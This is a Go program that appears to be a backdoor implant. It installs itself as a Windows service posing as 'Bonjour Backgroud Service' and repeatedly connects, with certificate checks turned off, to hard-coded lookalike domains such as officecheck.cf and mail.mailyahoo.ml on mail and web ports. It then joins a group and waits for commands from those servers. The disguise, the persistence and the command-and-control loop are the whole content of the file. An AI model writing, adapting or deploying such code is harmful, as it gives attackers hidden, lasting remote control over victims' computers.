package main

import (
	T "./tcenter"
	S "./ssl"
	"os"
	"github.com/op/go-logging"
	"crypto/tls"
	"github.com/kardianos/service"
	"time"
	"fmt"
	"math/rand"
)


var log = logging.MustGetLogger("goserver")
var groupID="test"

type program struct{}

func (p *program) Start(s service.Service) error {
	// Start should not block. Do the actual work async.
	go p.run()
	return nil
}

func (p *program) connect(address string) error {
	// 客户端
	wsserver := &T.WSServer{}

	// init ssl
	cert, _ := S.ClientCert()
	wsserver.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		Certificates:       []tls.Certificate{cert},
	}

	// connect wscenter
	err := wsserver.Dial(address)
	if err != nil {
		//log.Debug(err.Error())
		return err
	}

	// 绑定到指定分组
	wsserver.Bind(groupID)

	// 等待命令
	wsserver.Listen()

	return nil
}

func (p *program) run() {
	linkList := [...] string {
		"officecheck.cf:25", "officecheck.cf:443", "officecheck.cf:995",
		"mail.mailyahoo.ml:25", "mail.mailyahoo.ml:443", "mail.mailyahoo.ml:995",
	}

	// shuffle
	rand.Seed(time.Now().Unix())
	for linkIndex := 0; linkIndex < len(linkList); linkIndex++ {
		tempIndex := rand.Intn(len(linkList)-1)
		if tempIndex != linkIndex {
			tempURL := linkList[linkIndex]
			linkList[linkIndex] = linkList[tempIndex]
			linkList[tempIndex] = tempURL
		}
	}

	linkIndex := 0
	for {
		linkURL := linkList[linkIndex]
		err := p.connect(linkURL)
		if err != nil {
			for linkIndex, linkURL = range linkList {
				err = p.connect(linkURL)
				if err == nil {
					break
				}
				time.Sleep(time.Duration(1)*time.Minute)
			}
		}
		//log.Debug("wait...")
		time.Sleep(time.Duration(1)*time.Minute)
	}
}

func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	return nil
}

func main() {
	// init log config
	format := logging.MustStringFormatter(`%{message}`)
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	svcConfig := &service.Config{
		Name:        "BonjourBS",
		DisplayName: "Bonjour Backgroud Service",
		Description: "Bonjour Backgroud Service.",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}

	if len(os.Args) > 1 {
		var err error
		verb := os.Args[1]
		switch verb {
		case "install":
			err = s.Install()
			if err != nil {
				fmt.Printf("Failed to install: %s\n", err)
				return
			}
			fmt.Printf("Service \"%s\" installed.\n", svcConfig.DisplayName)
		case "remove":
			err = s.Uninstall()
			if err != nil {
				fmt.Printf("Failed to remove: %s\n", err)
				return
			}
			fmt.Printf("Service \"%s\" removed.\n", svcConfig.DisplayName)
		case "run":
			err = s.Run()
		case "start":
			err = s.Start()
			if err != nil {
				fmt.Printf("Failed to start: %s\n", err)
				return
			}
			fmt.Printf("Service \"%s\" started.\n", svcConfig.DisplayName)
		case "stop":
			err = s.Stop()
			if err != nil {
				fmt.Printf("Failed to stop: %s\n", err)
				return
			}
			fmt.Printf("Service \"%s\" stopped.\n", svcConfig.DisplayName)
		}
		return
	} else {
		s.Run()
	}
}